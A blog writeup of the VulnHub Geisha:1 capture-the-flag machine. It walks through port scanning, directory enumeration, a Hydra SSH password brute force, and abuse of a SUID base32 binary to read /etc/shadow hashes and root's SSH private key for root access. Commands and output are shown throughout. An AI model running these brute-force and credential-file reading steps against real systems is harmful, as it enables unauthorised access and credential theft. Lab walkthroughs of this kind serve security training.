---
title: Geisha:1 - Writeup
author: Elman Alizadeh
date: 2022-05-31 20:10:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, geisha]
---

Today we will take a look at Vulnhub: Geisha: 1. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-geisha/1.jpeg" | relative_url }})

## Network scan

```console
nmap -p- -sV -sC --open 192.168.215.82
PORT     STATE SERVICE        VERSION
21/tcp   open  ftp            vsftpd 3.0.3
22/tcp   open  ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1b:f2:5d:cd:89:13:f2:49:00:9f:8c:f9:eb:a2:a2:0c (RSA)
|   256 31:5a:65:2e:ab:0f:59:ab:e0:33:3a:0c:fc:49:e0:5f (ECDSA)
|_  256 c6:a7:35:14:96:13:f8:de:1e:e2:bc:e7:c7:66:8b:ac (ED25519)
80/tcp   open  http           Apache httpd 2.4.38 ((Debian))
|_http-title: Geisha
|_http-server-header: Apache/2.4.38 (Debian)
3389/tcp open  http           nginx 1.14.2
|_http-title: Seppuku
|_http-server-header: nginx/1.14.2
7080/tcp open  ssl/empowerid?
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://192.168.215.82:7080/
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
| ssl-cert: Subject: commonName=geisha/organizationName=webadmin/countryName=US
| Not valid before: 2020-05-09T14:01:34
|_Not valid after:  2022-05-09T14:01:34
7125/tcp open  http           nginx 1.17.10
|_http-title: Geisha
|_http-server-header: nginx/1.17.10
8088/tcp open  http           LiteSpeed httpd
|_http-title: Geisha
|_http-server-header: LiteSpeed
9198/tcp open  http           SimpleHTTPServer 0.6 (Python 2.7.16)
|_http-title: Geisha
|_http-server-header: SimpleHTTP/0.6 Python/2.7.16
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Gobuster

Command: gobuster dir -u http://192.168.215.82:7125/-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt

```console
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.215.82:7125/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt,
[+] Timeout:                 10s
===============================================================
2022/05/31 19:16:15 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 175]
/shadow               (Status: 403) [Size: 154]
/passwd               (Status: 200) [Size: 1432]
```

Url: http://192.168.215.82:7125/passwd

This is what we encounter when we go to Url

![Desktop View]({{ "/assets/img/vuln-geisha/2.png" | relative_url }})

```console
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
geisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lsadm:x:998:1001::/:/sbin/nologin
```

```console
$ cat passwd | grep home

geisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bash
```

## Hydra

I attacked with Hydra. I have a geisha as a user. It didn’t work the first time I attacked ftp. Then I decided to attack ssh.

```console
└─$ hydra -l geisha -P /usr/share/wordlists/rockyou.txt ssh://192.168.215.82:22
[DATA] attacking ssh://192.168.215.82:22/
[22][ssh] host: 192.168.215.82   login: geisha   password: letmein
1 of 1 target successfully completed, 1 valid password found
```

## Root

```console
geisha@geisha:~$ find / -perm -u=s 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/base32
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
```

[GFTO_base32](https://gtfobins.github.io/gtfobins/base32/)

### /etc/shadow

I wanted to break the hash in the /etc/shadow file, so I’ll use John.

```console
geisha@geisha:~$ LFILE=/etc/shadow
geisha@geisha:~$ base32 "$LFILE" | base32 --decode
root:$6$3haFwrdHJRZKWD./$LYiTApGClgwmFE3TXMRtekWpGOY6fSpnTorsQL/FBr9YdOW4NHMzYFkOLu8qJQVa1wqfEC3a.SZeTHIyEhlPF0:18446:0:99999:7:::
daemon:*:18385:0:99999:7:::
bin:*:18385:0:99999:7:::
sys:*:18385:0:99999:7:::
sync:*:18385:0:99999:7:::
games:*:18385:0:99999:7:::
man:*:18385:0:99999:7:::
lp:*:18385:0:99999:7:::
mail:*:18385:0:99999:7:::
news:*:18385:0:99999:7:::
uucp:*:18385:0:99999:7:::
proxy:*:18385:0:99999:7:::
www-data:*:18385:0:99999:7:::
backup:*:18385:0:99999:7:::
list:*:18385:0:99999:7:::
irc:*:18385:0:99999:7:::
gnats:*:18385:0:99999:7:::
nobody:*:18385:0:99999:7:::
_apt:*:18385:0:99999:7:::
systemd-timesync:*:18385:0:99999:7:::
systemd-network:*:18385:0:99999:7:::
systemd-resolve:*:18385:0:99999:7:::
messagebus:*:18385:0:99999:7:::
sshd:*:18385:0:99999:7:::
geisha:$6$YtDFbbhHHf5Ag5ej$3EjLFKW1aSNBlfAhcyjmY97eLrNtbzDWQ9z5YvSvuA65kH7ZgHR1f9VGFhAEGGqiKAtF8//U45M8QOHouQrWb.:18494:0:99999:7:::
systemd-coredump:!!:18385::::::
ftp:*:18391:0:99999:7:::
```

### John

It did not work. Then let’s check to get the id_rsa file.

```console
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:14 0.44% (ETA: 00:08:23) 0g/s 1004p/s 1004c/s 1004C/s prince5..mirko
Session aborted
```

### id_rsa

```console
geisha@geisha:~$ LFILE=/root/.ssh/id_rsa

geisha@geisha:~$ base32 "$LFILE" | base32 --decode
-----BEGIN RSA PRIVATE KEY-----
))))))))))))))))))))))))))))))))))))))))))
-----END RSA PRIVATE KEY-----
```
In local machine

```console
$ nano root

$ chmod 600 root

$ ssh root@192.168.215.82 -i root
```
![Desktop View]({{ "/assets/img/vuln-geisha/3.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/vuln-geisha/4.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”